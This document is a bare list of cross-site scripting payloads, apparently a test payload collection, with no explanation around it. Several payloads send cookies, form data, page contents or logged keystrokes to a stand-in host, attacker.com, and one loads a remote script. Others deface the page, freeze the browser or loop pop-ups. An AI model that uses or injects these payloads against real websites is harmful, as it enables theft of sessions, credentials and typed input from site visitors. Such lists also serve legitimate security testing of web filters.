"""
<script>alert('This is a basic XSS example!');</script>

<script>
  document.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

<script>
  var form = document.forms[0];
  form.action = 'http://attacker.com/steal-data';
  form.submit();
</script>

<script>
  while (true) {
    console.log('This will freeze the browser!');
  }
</script>

<script src="http://attacker.com/malicious.js"></script>

<script>
  fetch(document.URL).then(res => res.text()).then(data => {
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: data
    });
  });
</script>

<script>
  function annoyingPopUp() {
    alert('You cannot close this easily!');
    setTimeout(annoyingPopUp, 1000);
  }
  annoyingPopUp();
</script>

<script>
  document.addEventListener('keydown', function(e) {
    fetch('http://attacker.com/keys', {
      method: 'POST',
      body: e.key
    });
  });
</script>

<script>alert('Hacking attack-XSS!')</script>







"""